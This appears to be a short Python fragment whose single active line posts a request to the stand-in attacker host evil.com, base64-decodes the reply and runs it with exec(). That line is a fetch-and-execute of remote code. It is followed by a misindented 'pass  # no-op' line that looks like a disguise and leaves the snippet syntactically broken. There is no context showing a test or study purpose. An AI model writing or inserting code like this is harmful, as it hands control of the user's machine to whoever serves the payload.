import base64
import requests
exec(base64.b64decode(requests.post('http://evil.com/payload').text))
    pass  # no-op